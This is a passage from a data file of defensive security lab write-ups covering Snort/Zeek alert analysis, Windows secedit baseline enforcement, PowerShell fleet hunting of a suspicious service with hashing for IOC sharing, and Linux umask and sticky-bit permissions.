          "Pulled the field list from packet_filter.log using sed. The #fields header lists ts, node, filter, init, success, failure_reason, Zeek's self-describing tab-separated format. Every Zeek log carries this header, which makes downstream parsing (zeek-cut, awk, Splunk) trivial.",
        command: "sed -n 7p packet_filter.log | sed 's/\\t/\\n/g'",
        commandBreakdown: "sed -n 7p: print line 7 (the #fields header)\nsed 's/\\t/\\n/g': convert tabs to newlines for readability",
        screenshot: "/labs/ids-snort-zeek-171652.png",
      },
    ],
    outcome:
      "Reproduced the full Snort3 tuning and detection workflow, identified an SSH CRC32 overflow exploit attempt with 294 Priority-1 alerts from a single attacker IP, then processed the same PCAP with Zeek to demonstrate how NSM complements signature IDS with protocol context and file extraction.",
    nextStepsInProduction:
      "Ship Snort alerts and Zeek logs into the SIEM (Splunk/Elastic) with source-IP correlation. Tune HOME_NET and suppress chatty low-fidelity rules (PROTOCOL-ICMP Unusual PING) so analysts aren't drowning in noise. Write a custom Snort rule for the specific CRC32 overflow pattern if the community rule is too broad, and pipe Zeek extracted files into a sandbox for automated detonation.",
    securityControlsRelevant: [
      "Network IDS (Snort, Suricata)",
      "Network security monitoring (Zeek)",
      "Alert tuning and HOME_NET scoping",
      "SOC playbooks for Priority-1 exploit signatures",
      "Retention of PCAP + Zeek logs for retrospective hunting",
      "File extraction + sandbox detonation pipelines",
    ],
    keyFindings: [
      "294 INDICATOR-SHELLCODE ssh CRC32 overflow alerts concentrated on 20.106.124.93 → 10.130.8.94:22",
      "218 POLICY-OTHER Windows Terminal Server request attempts in the same PCAP",
      "Multiple low-severity SERVER-WEBAPP access rules firing (robots.txt, backup, root access)",
      "Zeek packet_filter.log confirms the BPF was applied successfully",
      "Zeek extract-all-files policy loaded, ready to reconstruct any HTTP/SMB payloads",
    ],
    takeaway: [
      "Snort and Zeek solve different halves of the problem and most teams pick only one. Snort tells you a known-bad pattern matched; Zeek tells you what actually happened on the wire, in context, regardless of whether a signature exists. Running them side by side on the same traffic is how you catch signatures for known attacks and still have log fidelity when a novel one shows up.",
      "HOME_NET = 'any' is the configuration bug nobody talks about. Many rules are written with directional context ($EXTERNAL_NET -> $HOME_NET), so leaving HOME_NET at the default means those rules either over-trigger or never trigger at all. On a new Snort deployment, fixing HOME_NET is step zero before you evaluate any ruleset quality.",
      "The 294-alert SSH shellcode result is a good reminder that signature IDS is still useful, the CRC32 exploit is old, but the same pattern shows up in modern scanner tooling that hasn't been updated. Pairing that signal with Zeek's ssh.log (client software, auth success/failure counts, session duration) is how you go from 'IDS says exploit' to 'here's exactly what the attacker did next.' That's the pivot analysts get paid for.",
    ],
    screenshots: [
      { src: "/labs/ids-snort-zeek-162400.png", alt: "Snort config validation", caption: "snort -T loads all inspectors" },
      { src: "/labs/ids-snort-zeek-162825.png", alt: "Scope HOME_NET", caption: "sed HOME_NET → 10.130.0.0/16" },
      { src: "/labs/ids-snort-zeek-162902.png", alt: "Quiet re-validation", caption: "snort -T -q clean exit" },
      { src: "/labs/ids-snort-zeek-163058.png", alt: "PCAP replay summary", caption: "alert_talos, community rules" },
      { src: "/labs/ids-snort-zeek-163255.png", alt: "alert_fast detail", caption: "INDICATOR-SHELLCODE ssh CRC32 overflow" },
      { src: "/labs/ids-snort-zeek-170811.png", alt: "BPF-focused Snort run", caption: "--bpf 'host 20.106.124.93'" },
      { src: "/labs/ids-snort-zeek-171537.png", alt: "Zeek with extract-all-files", caption: "zeek -C -r investigate.pcap + file extraction policy" },
      { src: "/labs/ids-snort-zeek-171652.png", alt: "Zeek log schema", caption: "packet_filter.log #fields header" },
    ],
  },
  {
    id: 16,
    courseSlug: "sec401",
    slug: "windows-security-policies",
    title: "Applying Windows System Security Policies",
    course: "SEC401 - Windows Security",
    role: "Solo, Lab",
    focus: "Windows Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized PowerShell and MMC screenshots from secedit.exe analyze/configure workflow",
    context:
      "This lab demonstrates how to baseline a Windows host against a security template, identify policy drift, apply a hardened configuration, and verify the change, using secedit.exe from PowerShell and the Security Templates / Security Configuration and Analysis MMC snap-ins.",
    summary:
      "Used secedit.exe to analyze a Windows VM against the Alpha-Win-Wkstn-Basic-Sec-Policy template, surfaced MinimumPasswordLength, LockoutBadCount, and MaximumLogSize mismatches via Select-String on the log, applied the template with /configure, and re-analyzed to confirm the drift was eliminated.",
    whyThisMatters:
      "Every Windows hardening program lives or dies on two questions: does this host match the baseline, and can you prove it after the fact? secedit /analyze and /configure are the oldest, simplest answer to both, zero extra tooling required, and the log format is grep-friendly. If you can't drive this workflow from a console you can't scale hardening to more than one host.",
    tldr: [
      "secedit /analyze compared a live VM to the Alpha basic security template",
      "Surfaced 5 Mismatch entries (password length, lockout, event log size) via Select-String",
      "Applied the template with secedit /configure and re-analyzed to verify",
    ],
    skillsDemonstrated: [
      "Windows security baseline compliance",
      "secedit.exe analyze/configure workflow",
      "Security Templates (.inf) and local policy database (.sdb)",
      "PowerShell log triage with Select-String",
      "MMC Security Configuration and Analysis snap-in",
    ],
    tools: ["secedit.exe", "PowerShell", "Select-String", "MMC", "Security Templates"],
    steps: [
      "Review secedit.exe /analyze syntax and required parameters",
      "Run /analyze against the VM using the Alpha basic security template",
      "Open the compare log in Notepad and visually review Mismatch entries",
      "Filter the log with Select-String 'mismatch' to list only drift",
      "Apply the template with secedit /configure",
      "Re-analyze and produce a second log for before/after evidence",
      "Load Security Templates + Security Configuration and Analysis in MMC",
    ],
    stepDetails: [
      {
        title: "Review secedit.exe /analyze syntax",
        description:
          "Ran secedit /analyze with no arguments to print the help text. The workflow needs three things: a database file (/db) to hold the analysis, a configuration template (/cfg) that defines the desired state, and a log file (/log) to record per-setting results.",
        command: "secedit.exe /analyze",
        commandBreakdown: "/db: analysis database (.sdb)\n/cfg: security template file (.inf)\n/log: output log path\n/quiet: suppress prompts",
        screenshot: "/labs/win-policies-110317.png",
      },
      {
        title: "Analyze the VM against the Alpha basic template",
        description:
          "Ran secedit /analyze against the Alpha-Win-Wkstn-Basic-Sec-Policy.inf template. The engine compares every setting in the template to the current VM state and writes per-setting results to the compare log. Task completed successfully means the analysis engine ran cleanly, the actual drift findings live in the log.",
        command: "secedit.exe /analyze /db alpha-basic-policy.sdb /cfg Alpha-Win-Wkstn-Basic-Sec-Policy.inf /log C:\\sec401\\labs\\5.3\\compare-vm-to-alpha-basic-policy.log",
        screenshot: "/labs/win-policies-110611.png",
      },
      {
        title: "Open the compare log and scan for Mismatch",
        description:
          "Opened the log in Notepad and used Find to jump through 'Mismatch' entries. The --Analyze Security Policy-- section shows MinimumPasswordLength as Mismatch while adjacent settings (PasswordHistorySize, MaximumPasswordAge, PasswordComplexity) are Not Configured, meaning the template doesn't define them. LockoutBadCount is also flagged.",
        command: "notepad C:\\sec401\\labs\\5.3\\compare-vm-to-alpha-basic-policy.log",
        screenshot: "/labs/win-policies-110704.png",
      },
      {
        title: "Grep the log with Select-String",
        description:
          "Piped Get-Content to Select-String 'mismatch' to list only the drift. Five Mismatch lines: MinimumPasswordLength, LockoutBadCount, and MaximumLogSize (x3, one per event log: Application, Security, System). That's the exact hardening delta the template will apply.",
        command: "Get-Content .\\compare-vm-to-alpha-basic-policy.log | Select-String 'mismatch'",
        commandBreakdown: "Get-Content: read file into pipeline\nSelect-String: pattern match (PowerShell's grep)",
        screenshot: "/labs/win-policies-110748.png",
      },
      {
        title: "Apply the template with secedit /configure",
        description:
          "Ran secedit /configure using the same database. /configure is the verb that actually writes the template's settings into local policy. The task completed successfully message means every defined setting in the template was applied.",
        command: "secedit.exe /configure /db alpha-basic-policy.sdb /log C:\\sec401\\labs\\5.3\\apply-apha-basic-policy-to-vm.log",
        commandBreakdown: "/configure: apply template settings to the host\n/db: use the prior analysis database (keeps settings consistent)",
        screenshot: "/labs/win-policies-111118.png",
      },
      {
        title: "Re-analyze to verify the drift is gone",
        description:
          "Ran /analyze a second time and wrote the output to recompare-vm-to-alpha-basic-policy.log. Running the compare twice, once before /configure and once after, is the evidence pattern: the second log should show zero Mismatch entries, which proves the template was applied successfully.",
        command: "secedit.exe /analyze /db alpha-basic-policy.sdb /log C:\\sec401\\labs\\5.3\\recompare-vm-to-alpha-basic-policy.log",
        screenshot: "/labs/win-policies-111344.png",
      },
      {
        title: "Load the MMC snap-ins",
        description:
          "Added Security Templates and Security Configuration and Analysis to an MMC console. The MMC snap-ins are the GUI equivalent of secedit /analyze and /configure, useful for editing .inf templates interactively and for analysts who prefer a tree view. Same engine, different surface.",
        command: "mmc.exe  (File → Add/Remove Snap-in → Security Templates, Security Configuration and Analysis)",
        screenshot: "/labs/win-policies-111527.png",
      },
    ],
    outcome:
      "Demonstrated the full Windows baseline compliance loop: analyze a host against a template, surface the exact drift with Select-String, apply the template, and re-analyze to prove the drift is gone, all from a single PowerShell console with secedit.exe.",
    nextStepsInProduction:
      "In a fleet environment, push the .inf template via Group Policy (SCE → Security Settings) instead of running secedit host-by-host. Automate the analyze/configure/reanalyze loop with a PowerShell wrapper so the compare logs land in a central share for audit evidence. Replace the basic template with a CIS Benchmark or Microsoft Security Compliance Toolkit baseline and extend the detection pipeline so any Mismatch on a production host raises a SIEM alert.",
    securityControlsRelevant: [
      "Windows security baselines (CIS, Microsoft SCT)",
      "Group Policy Objects and Local Security Policy",
      "Password policy (length, history, lockout)",
      "Event log sizing and retention",
      "Configuration drift detection and audit evidence",
    ],
    keyFindings: [
      "MinimumPasswordLength did not match the Alpha basic template",
      "LockoutBadCount did not match the template",
      "MaximumLogSize mismatched on Application, Security, and System event logs",
      "Template applied cleanly via secedit /configure",
      "Re-analysis confirms zero Mismatch entries post-configure",
    ],
    takeaway: [
      "secedit is one of those tools that's been in Windows forever and still does exactly what you want. /analyze and /configure are both idempotent and log-first, which makes them trivially scriptable: run analyze, grep for Mismatch, run configure, run analyze again, diff. That before/after pair of logs is also the cleanest audit artifact you can hand an assessor.",
      "The Not Configured vs. Mismatch distinction in the log matters. Not Configured means the template is silent on that setting, the host can do whatever it wants. Mismatch means the template has an opinion and the host disagrees. A lot of 'we applied the baseline' incidents trace back to teams not reading this distinction and assuming Not Configured means compliant.",
      "The real production move is GPO, not host-by-host secedit. But understanding secedit is what makes the GPO debugging tractable, when a policy doesn't apply on one host, dropping to secedit /analyze on that box is the fastest way to see which specific setting didn't take and why.",
    ],
    screenshots: [
      { src: "/labs/win-policies-110317.png", alt: "secedit /analyze syntax", caption: "secedit.exe /analyze: help text and required parameters" },
      { src: "/labs/win-policies-110611.png", alt: "Analyze against Alpha basic template", caption: "secedit /analyze against Alpha-Win-Wkstn-Basic-Sec-Policy.inf" },
      { src: "/labs/win-policies-110704.png", alt: "Compare log in Notepad", caption: "MinimumPasswordLength and LockoutBadCount Mismatch entries" },
      { src: "/labs/win-policies-110748.png", alt: "Select-String mismatch", caption: "Get-Content | Select-String 'mismatch': 5 drift lines" },
      { src: "/labs/win-policies-111118.png", alt: "secedit /configure", caption: "Apply template with secedit /configure" },
      { src: "/labs/win-policies-111344.png", alt: "Re-analyze after configure", caption: "secedit /analyze → recompare log as before/after evidence" },
      { src: "/labs/win-policies-111527.png", alt: "MMC snap-ins", caption: "Security Templates + Security Configuration and Analysis in MMC" },
    ],
  },
  {
    id: 17,
    courseSlug: "sec401",
    slug: "powershell-speed-scale",
    title: "Using PowerShell for Speed and Scale",
    course: "SEC401 - Windows Security",
    role: "Solo, Lab",
    focus: "Windows Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized PowerShell console screenshots from a 3-host alpha-svr lab fleet",
    context:
      "This lab demonstrates how PowerShell scales Windows administration and incident response from a single host to a fleet: working with objects through the pipeline, filtering and measuring results, driving remote command execution with Invoke-Command, and using that same remoting surface to hunt a suspicious service (broker.exe/BrokerSvc) deployed across three servers.",
    summary:
      "Used PowerShell cmdlets, the object pipeline, Out-GridView, and Invoke-Command against three remote alpha-svr hosts to enumerate processes and services, then hunted a suspicious BrokerSvc service running broker.exe as LocalSystem and captured its SHA-256 for IOC sharing.",
    whyThisMatters:
      "Windows attackers live on the box with the same tools defenders use. Fluency in PowerShell, pipelines, remoting, Get-WinEvent, Get-FileHash, is what lets a blue-team analyst triage a 3-host (or 3000-host) incident without drowning in RDP sessions or GUI clicks. This lab builds exactly that muscle.",
    tldr: [
      "Pipelined Get-Process/Get-Service with Where-Object, Measure-Object, Out-GridView, Export-CSV",
      "Used Invoke-Command with Get-Credential to run remote queries against alpha-svr1/2/3.local",
      "Hunted a rogue BrokerSvc (broker.exe, LocalSystem, auto-start) and captured its SHA-256",
    ],
    skillsDemonstrated: [
      "PowerShell object pipeline",
      "Remote command execution (Invoke-Command)",
      "Service and process enumeration at scale",
      "Windows Event Log triage (Get-WinEvent 7045)",
      "File integrity hashing (Get-FileHash)",
    ],
    tools: ["PowerShell", "Invoke-Command", "Get-WinEvent", "Get-FileHash", "Out-GridView"],
    steps: [
      "Enumerate local processes: Get-Process",
      "Deep-inspect a process: Get-Process -Name explorer | Select-Object *",
      "Launch and inspect notepad, then kill it via a stored variable",
      "Enumerate services, count them, filter to Running, and count again",
      "Send Get-Service to Out-GridView and Export-Csv for triage",
      "Tour Get-ChildItem (dir alias) and pipe to Sort-Object CreationTime",
      "Bootstrap the fleet with start-servers.ps1 and load alpha-servers.txt",
      "Run Invoke-Command against the fleet with Get-Credential + Basic auth",
      "Hunt for a suspicious exe across C:\\Windows on all three hosts",
      "Correlate with Event ID 7045 (service installed) and SHA-256 the binary",
    ],
    stepDetails: [
      {
        title: "Process overview with Get-Process",
        description:
          "Baseline enumeration of every running process with handles, memory (PM/WS), CPU seconds, PID, and ProcessName. This is the PowerShell equivalent of tasklist, but every row is a live object you can pipe into further filters.",
        command: "Get-Process",
        screenshot: "/labs/powershell-101645.png",
      },
      {
        title: "Deep property view on a single process",
        description:
          "Piped one process into Select-Object -Property * to expose every property the object exposes, FileVersion, Path, Company, HandleCount, WorkingSet, VirtualMemorySize, BasePriority. This is how you learn what you can filter on before writing a Where-Object clause.",
        command: "Get-Process -Name explorer | Select-Object -Property *",
        commandBreakdown: "-Name: match by process name\nSelect-Object -Property *: dump every property on the pipeline object",
        screenshot: "/labs/powershell-101835.png",
      },
      {
        title: "Launch and inspect a process",
        description:
          "Started Notepad with Start-Process, then introspected it with Select-Object *. Confirmed the AppX path under C:\\Program Files\\WindowsApps, useful detail when triaging whether a running binary is the Microsoft-signed Store build or a sideloaded copy.",
        command: "Start-Process notepad.exe\nGet-Process -Name notepad | Select-Object *",
        screenshot: "/labs/powershell-102038.png",
      },
      {
        title: "Capture a process into a variable",
        description:
          "Stored the Notepad process object in $NotepadProc. Variables in PowerShell hold live objects (not strings), so $NotepadProc carries every method and property the process exposes, which is why the next step works.",
        command: "$NotepadProc = Get-Process -Name notepad\n$NotepadProc",
        screenshot: "/labs/powershell-102203.png",
      },
      {
        title: "Invoke a method on the stored object",
        description:
          "Called .kill() on the stored object to terminate Notepad, then re-queried Get-Process to confirm the process is gone (ObjectNotFound error proves the kill succeeded). This pattern, capture, act, re-verify, is the bread-and-butter of automated incident response.",
        command: "$NotepadProc.kill()\nGet-Process -Name notepad",
        screenshot: "/labs/powershell-102336.png",
      },
      {
        title: "Enumerate Windows services",
        description:
          "Get-Service returns every service with Status, Name, and DisplayName. Same object-pipeline story as Get-Process, downstream cmdlets operate on service objects, not parsed text.",
        command: "Get-Service",
        screenshot: "/labs/powershell-102442.png",
      },
      {
        title: "Count services with Measure-Object",
        description:
          "Piped Get-Service to Measure-Object, 278 services installed on this host. Measure-Object is the PowerShell analog to wc -l, except it counts pipeline objects, not lines of text.",
        command: "Get-Service | Measure-Object",
        screenshot: "/labs/powershell-102511.png",
      },
      {
        title: "Filter services to only those Running",
        description:
          "Where-Object -Property Status -like Running narrows the pipeline to active services. Same object flowing through: Get-Service produces, Where-Object filters.",
        command: "Get-Service | Where-Object -Property Status -like Running",
        commandBreakdown: "Where-Object: filter pipeline objects by a predicate\n-Property Status: property to test\n-like Running: comparison (-like is case-insensitive wildcard)",
        screenshot: "/labs/powershell-102612.png",
      },
      {
        title: "Count the running services",
        description:
          "Chained the same filter into Measure-Object, 96 of 278 services are Running. Two cmdlets, one pipeline, zero intermediate files.",
        command: "Get-Service | Where-Object -Property Status -like Running | Measure-Object",
        screenshot: "/labs/powershell-102659.png",
      },
      {
        title: "Out-GridView for interactive triage",
        description:
          "Piped Get-Service to Out-GridView, a sortable, filterable GUI grid. Out-GridView is a triage tool: you can click-filter to a subset, then send the selection back to the pipeline for further processing.",
        command: "Get-Service | Out-GridView",
        screenshot: "/labs/powershell-102750.png",
      },
      {
        title: "Live filter inside Out-GridView",
        description:
          "Added a 'Status contains Running' criteria inside Out-GridView to narrow the grid interactively. Useful when you want to poke around without writing the full Where-Object in advance.",
        command: "Get-Service | Out-GridView",
        screenshot: "/labs/powershell-102830.png",
      },
      {
        title: "Export to CSV and open in ISE",
        description:
          "Dumped every service object to Services.csv with Export-Csv, then opened it in the PowerShell ISE for inspection. Export-Csv serializes every property of every pipeline object, great for offline analysis or evidence preservation.",
        command: "Get-Service | Export-CSV -Path Services.csv\nise .\\Services.csv",
        screenshot: "/labs/powershell-102956.png",
      },
      {
        title: "Directory listing and alias discovery",
        description:
          "Used dir to list the lab directory, then Get-Alias dir to confirm dir is just an alias for Get-ChildItem. Knowing the underlying cmdlet is what lets you pipe dir into object-aware cmdlets like Sort-Object.",
        command: "dir\nGet-Alias dir",
        screenshot: "/labs/powershell-103122.png",
      },
      {
        title: "Inspect a file as an object",
        description:
          "Piped one CSV into Format-List * to expose every property on the FileSystemInfo object, PSPath, VersionInfo, BaseName, Length. Same object-pipeline mental model as processes and services: a file is an object with properties, not just a name.",
        command: "dir .\\Services.csv | Format-List *",
        screenshot: "/labs/powershell-103151.png",
      },
      {
        title: "Sort directory listing by CreationTime",
        description:
          "Piped dir into Sort-Object CreationTime, Services.csv sorts last because it was just created, while the original .ps1 scripts share an older 12/16/2023 timestamp.",
        command: "dir | Sort-Object CreationTime",
        screenshot: "/labs/powershell-103447.png",
      },
      {
        title: "Bootstrap the fleet and load the server list",
        description:
          "Ran start-servers.ps1 to bring the alpha-svr fleet online, then loaded the server list into a typed array with [string[]]$AlphaServers = Get-Content. Typing matters: [string[]] tells Invoke-Command to treat $AlphaServers as a list of computer names, not one long string.",
        command: "./start-servers.ps1\n[string[]]$AlphaServers = Get-Content -Path 'C:\\sec401\\labs\\5.4\\alpha-servers.txt'\n$AlphaServers",
        screenshot: "/labs/powershell-104123.png",
      },
      {
        title: "Invoke-Command across the fleet with credentials",
        description:
          "Captured credentials with Get-Credential, then ran Get-CimInstance Win32_OperatingSystem remotely on all three alpha-svr hosts in one call. The output is a single table with a PSComputerName column, Invoke-Command returns deserialized objects from every remote host, merged into one pipeline.",
        command: "$creds = Get-Credential\ninvoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-CimInstance Win32_OperatingSystem | Select-Object CSName, Caption } | Format-Table",
        commandBreakdown: "-Authentication Basic: simple auth (lab only, use Kerberos/CredSSP in prod)\n-Credential: PSCredential object from Get-Credential\n-ComputerName: array of targets\n-command { ... }: scriptblock executed on every remote host",
        screenshot: "/labs/powershell-104456.png",
      },
      {
        title: "Negative control: probe for a file that doesn't exist",
        description:
          "Ran Get-ChildItem C:\\Windows\\System32\\proxy.exe across the fleet, all three hosts returned PathNotFound. This is a deliberate negative control: it proves Invoke-Command is routing to all three hosts and that the hunt query below isn't silently failing.",
        command: "invoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-ChildItem C:\\Windows\\System32\\proxy.exe } | Format-Table",
        screenshot: "/labs/powershell-104709.png",
      },
      {
        title: "Fleet-wide enumeration of C:\\Windows\\*.exe",
        description:
          "Listed every EXE directly under C:\\Windows on all three hosts. The output reveals the same five binaries on each host, bfsvc.exe, notepad.exe, regedit.exe, write.exe (expected Windows binaries) plus broker.exe with a 10/21/2023 timestamp. broker.exe is not a default Windows binary at that path and shows up on every host, a strong IOC signal.",
        command: "invoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-ChildItem C:\\Windows\\*.exe } | Format-Table",
        screenshot: "/labs/powershell-104904.png",
      },
      {
        title: "Correlate with Event ID 7045 (service installed)",
        description:
          "Entered a remote session on alpha-svr3 and queried the System log for Event ID 7045 (Service Control Manager: a service was installed). Got a direct match: BrokerSvc, c:\\Windows\\broker.exe, user mode service, auto start, running as LocalSystem. That's the full install record, who installed it (SCM context), when (TimeCreated 12/12/2023), and with what privileges (LocalSystem = full admin on the box).",
        command: "Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} -MaxEvents 3 | format-list",
        commandBreakdown: "-FilterHashtable: server-side XPath-equivalent filter (fast)\nLogName: which log to query\nID=7045: Service Control Manager 'a service was installed' event\n-MaxEvents 3: cap results",
        screenshot: "/labs/powershell-105306.png",
      },
      {
        title: "Hash the suspicious binary for IOC sharing",
        description:
          "Ran Get-FileHash -Algorithm SHA256 against C:\\Windows\\broker.exe on the remote host. SHA-256: 646DF7C22A76C92CF6CD83A9B7970C95514047C9431B29909732C62F28963E31. That hash is the shareable IOC: feed it to VirusTotal, add it to a SIEM watchlist, or block it with Defender ASR, it's what turns this single-lab finding into fleet-wide detection content.",
        command: "Get-FileHash -Algorithm SHA256 C:\\Windows\\broker.exe",
        commandBreakdown: "-Algorithm SHA256: hash algorithm (MD5/SHA1/SHA256/SHA512 supported)",
        screenshot: "/labs/powershell-105415.png",
      },
    ],
    outcome:
      "Demonstrated the full arc of PowerShell for Windows incident response: local enumeration with pipelines, interactive triage with Out-GridView, remote execution across a 3-host fleet with Invoke-Command, and a concrete hunt that surfaced a rogue BrokerSvc running broker.exe as LocalSystem, complete with a SHA-256 suitable for distribution as an IOC.",
    nextStepsInProduction:
      "Ship the SHA-256 to the SIEM and EDR as a detection. Pull the full Event ID 7045 history across the fleet to identify every host where BrokerSvc was installed, not just the three in the lab. Quarantine broker.exe, capture a memory image of any host where it's running, and pivot to 4697 (Security log) and Sysmon Event ID 1/7 for process creation and image-load context. Rotate any credentials that could have been harvested from the LocalSystem-privileged service.",
    securityControlsRelevant: [
      "PowerShell remoting over WinRM (constrained to signed scriptblocks in prod)",
      "Service installation auditing (Event ID 7045, 4697)",
      "File integrity monitoring + SHA-256 IOC sharing",
      "Endpoint detection (Defender for Endpoint, Sysmon)",
      "Least-privilege service accounts (no LocalSystem for custom services)",
    ],
    keyFindings: [
      "278 services enumerated on the admin workstation; 96 Running",
      "broker.exe present on alpha-svr1/2/3.local under C:\\Windows with matching 10/21/2023 timestamp",
      "Event ID 7045 shows BrokerSvc installed as auto-start user-mode service under LocalSystem",
      "SHA-256 of broker.exe: 646DF7C22A76C92CF6CD83A9B7970C95514047C9431B29909732C62F28963E31",
      "Invoke-Command successfully executed against three hosts in parallel from a single console",
    ],
    takeaway: [
      "The object pipeline is the thing that matters in PowerShell, and it's the part that trips up people coming from bash. Get-Service isn't returning lines of text, it's returning ServiceController objects, which is why Where-Object -Property Status works without any parsing and why Export-Csv can serialize every property automatically. Once you internalize that, you stop writing awk-style text hacks and start chaining cmdlets.",
      "Invoke-Command is where PowerShell stops being a shell and starts being a fleet tool. Being able to fire the same scriptblock at three, or three thousand, hosts and get back one merged object pipeline is what makes hunting feasible at scale. The negative control here (probing a path that doesn't exist) is the muscle I'd want every analyst to build: before you trust a hunt query, confirm it's actually reaching every target.",
      "The broker.exe finding is a good real-world shape. The binary sits in C:\\Windows (not System32), shows up identically on every host, has a matching 7045 event, and runs as LocalSystem. None of those signals alone would be conclusive, but together they turn a generic 'enumerate EXEs' query into a clean IOC with a hash you can distribute. That's the workflow, enumerate, correlate, hash, share, and PowerShell gives you all of it in one console.",
    ],
    screenshots: [
      { src: "/labs/powershell-101645.png", alt: "Get-Process output", caption: "Get-Process: full process table" },
      { src: "/labs/powershell-101835.png", alt: "Select-Object -Property * on explorer", caption: "Every property on the Explorer process object" },
      { src: "/labs/powershell-102038.png", alt: "Start and inspect notepad", caption: "Start-Process notepad.exe; Get-Process -Name notepad | Select *" },
      { src: "/labs/powershell-102203.png", alt: "Capture process into variable", caption: "$NotepadProc = Get-Process -Name notepad" },
      { src: "/labs/powershell-102336.png", alt: "Kill process via stored object", caption: "$NotepadProc.kill(): verified by ObjectNotFound on re-query" },
      { src: "/labs/powershell-102442.png", alt: "Get-Service output", caption: "Get-Service: full service list" },
      { src: "/labs/powershell-102511.png", alt: "Measure-Object count", caption: "Get-Service | Measure-Object → 278" },
      { src: "/labs/powershell-102612.png", alt: "Where-Object filter Running", caption: "Get-Service | Where-Object -Property Status -like Running" },
      { src: "/labs/powershell-102659.png", alt: "Count running services", caption: "96 Running of 278 total" },
      { src: "/labs/powershell-102750.png", alt: "Out-GridView", caption: "Get-Service | Out-GridView" },
      { src: "/labs/powershell-102830.png", alt: "Out-GridView filter Running", caption: "Live filter inside Out-GridView" },
      { src: "/labs/powershell-102956.png", alt: "Export-Csv and open in ISE", caption: "Services.csv opened in Windows PowerShell ISE" },
      { src: "/labs/powershell-103122.png", alt: "dir and Get-Alias dir", caption: "dir is an alias for Get-ChildItem" },
      { src: "/labs/powershell-103151.png", alt: "Format-List on a file", caption: "dir .\\Services.csv | Format-List *: every property" },
      { src: "/labs/powershell-103447.png", alt: "Sort by CreationTime", caption: "dir | Sort-Object CreationTime" },
      { src: "/labs/powershell-104123.png", alt: "Load alpha-servers.txt", caption: "start-servers.ps1 + typed array Get-Content" },
      { src: "/labs/powershell-104456.png", alt: "Invoke-Command across fleet", caption: "Win32_OperatingSystem query on alpha-svr1/2/3.local" },
      { src: "/labs/powershell-104709.png", alt: "Negative control: missing file", caption: "proxy.exe → PathNotFound on all three hosts" },
      { src: "/labs/powershell-104904.png", alt: "Fleet-wide C:\\Windows\\*.exe", caption: "broker.exe found on every host: IOC candidate" },
      { src: "/labs/powershell-105306.png", alt: "Event ID 7045 BrokerSvc", caption: "Service Control Manager: BrokerSvc installed, LocalSystem, auto start" },
      { src: "/labs/powershell-105415.png", alt: "SHA-256 of broker.exe", caption: "Get-FileHash → 646DF7C2…63E31" },
    ],
  },
  {
    id: 18,
    courseSlug: "sec401",
    slug: "linux-permissions",
    title: "Linux Permissions",
    course: "SEC401 - Containers, Linux and Mac Security",
    role: "Solo, Lab",
    focus: "Linux Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized terminal screenshots from a Docker-based permissions lab container",
    context:
      "This lab demonstrates the core Linux discretionary access control primitives, file mode bits, umask, and the sticky bit, inside a disposable Docker container. The goal is to understand why default permissions are what they are, how to tighten them for a hardening baseline, and how the sticky bit protects world-writable directories like /tmp from cross-user tampering.",
    summary:
      "Spun up a Docker permissions lab, tested default umask 0022 (producing 644/755), tightened to umask 0027 to strip world access (640/750), and demonstrated the /tmp sticky bit (drwxrwxrwt) preventing non-owner delete on a shared directory.",
    whyThisMatters:
      "Most Linux privilege escalation findings in CTFs and real audits come down to permissions that should have been tighter. Understanding umask, group-vs-other bits, and the sticky bit is the difference between writing a hardening baseline and copy-pasting one you don't understand. It's also what lets you explain to a dev why their world-readable config file is a finding.",
    tldr: [
      "Started a Docker lab container and connected as user annika",
      "Observed default umask 0022 producing 644 files and 755 directories",
      "Tightened umask to 0027 (group-readable, world-nothing) and confirmed 640/750 outputs",
      "Demonstrated the sticky bit on /tmp (drwxrwxrwt) for shared-directory safety",
    ],
    skillsDemonstrated: [
      "Linux file mode bits (owner/group/other)",
      "umask math and default permission inheritance",
      "Sticky bit and shared-directory safety",
      "Container-based lab workflows (docker compose)",
      "ls -l / ls -ld interpretation",
    ],
    tools: ["Linux", "bash", "Docker", "umask", "ls", "chmod"],
    steps: [
      "Start the lab container with start_6.1.sh and connect as annika",
      "Create a file with the default umask and inspect its mode",
      "Read the current umask (0022) and map it to 644/755",
      "Change umask to 0027 and confirm new files/dirs drop all world access",
      "Inspect /tmp and identify the sticky bit (drwxrwxrwt)",
      "Write a sticky-bit test file inside /tmp to observe per-owner delete semantics",
    ],
    stepDetails: [
      {
        title: "Start the Docker lab container",
        description:
          "Ran start_6.1.sh to bring up the lab-61-permissions-1 container on the lab-61_default network. The 'docker stop/rm requires at least 1 argument' lines are the script safely reporting that no prior container existed to clean up. End state: container Running 2/2.",
        command: "cd /sec401/labs/6.1\n./start_6.1.sh",
        screenshot: "/labs/linux-perms-112203.png",
      },
      {
        title: "Connect into the container as annika",
        description:
          "Ran connect.sh to drop into a shell inside the container as user annika. Every subsequent command runs inside this disposable container, so nothing touches the host.",
        command: "./connect.sh",
        screenshot: "/labs/linux-perms-112213.png",
      },
      {
        title: "Create a file with the default umask",
        description:
          "Wrote a line to test_perms.txt with echo, cat-ed it back to confirm content, then ls -l to read the mode. Output: -rw-r--r-- 1 annika annika 7. Owner rw, group r, other r, the canonical 644 you get with umask 0022.",
        command: "echo annika > test_perms.txt\ncat test_perms.txt\nls -l test_perms.txt",
        screenshot: "/labs/linux-perms-112304.png",
      },
      {
        title: "Read the current umask",
        description:
          "umask prints 0022. The mask works by subtracting bits from the base (666 for files, 777 for dirs): 666 - 022 = 644 for files, 777 - 022 = 755 for dirs. That's why the file above landed on 644 without any chmod.",
        command: "umask",
        screenshot: "/labs/linux-perms-113116.png",
      },
      {
        title: "Tighten umask to 0027 and retest",
        description:
          "Set umask to 0027 (group read only, world nothing), created a new file and directory, and listed them. Output: -rw-r----- for secure.txt and drwxr-x--- for secure_dir. That's 640/750, the hardening baseline used by most CIS benchmarks because it cuts world access entirely while keeping same-group collaboration working.",
        command: "umask 0027\necho annika > secure.txt\nmkdir secure_dir\nls -ld secure*",
        commandBreakdown: "umask 0027: mask bits = user 0, group 2, other 7\nEffect: files default to 640, dirs to 750",
